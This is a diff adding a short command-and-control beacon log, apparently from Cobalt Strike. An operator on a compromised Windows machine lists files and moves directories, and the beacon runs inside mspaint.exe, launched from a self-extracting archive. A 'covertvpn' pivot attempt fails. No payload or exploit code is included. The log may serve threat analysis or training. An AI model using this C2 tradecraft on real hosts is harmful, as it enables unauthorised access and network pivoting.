@@ -1,0 +1,35 @@
+12/19 11:24:00 UTC [metadata] 192.168.2.189 <- 192.168.2.189; computer: ACER; user: david; process: mspaint.exe; pid: 18876; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+12/19 11:24:21 UTC [input] <neo> ls
+12/19 11:24:21 UTC [task] <> Tasked beacon to list files in .
+12/19 11:24:53 UTC [checkin] host called home, sent: 19 bytes
+12/19 11:24:53 UTC [output]
+C:\Users\david\AppData\Local\Temp\RarSFX1\*
+D	0	12/19/2022 18:22:53	.
+D	0	12/19/2022 18:22:53	..
+F	927232	12/19/2022 18:21:03	a.exe
+F	2247	12/15/2022 15:25:31	Google Chrome.lnk
+
+
+12/19 11:25:19 UTC [input] <neo> cd ../../../../../..
+12/19 11:25:19 UTC [task] <> cd ../../../../../..
+12/19 11:25:42 UTC [input] <neo> pwd
+12/19 11:25:42 UTC [task] <> Tasked beacon to print working directory
+12/19 11:25:53 UTC [checkin] host called home, sent: 33 bytes
+12/19 11:25:53 UTC [output]
+Current directory is C:\
+
+12/19 11:28:13 UTC [input] <neo> pwd
+12/19 11:28:13 UTC [task] <> Tasked beacon to print working directory
+12/19 11:28:53 UTC [checkin] host called home, sent: 8 bytes
+12/19 11:28:53 UTC [output]
+Current directory is C:\
+
+12/19 11:31:53 UTC [checkin] host called home, sent: 1522 bytes
+12/19 11:35:24 UTC [input] <neo> covertvpn phear0 192.168.2.189
+12/19 11:35:24 UTC [error] CovertVPN is not compatible with Windows 10
+12/19 11:38:09 UTC [input] <neo> pwd
+12/19 11:38:09 UTC [task] <> Tasked beacon to print working directory
+12/19 11:38:54 UTC [checkin] host called home, sent: 8 bytes
+12/19 11:38:54 UTC [output]
+Current directory is C:\
+
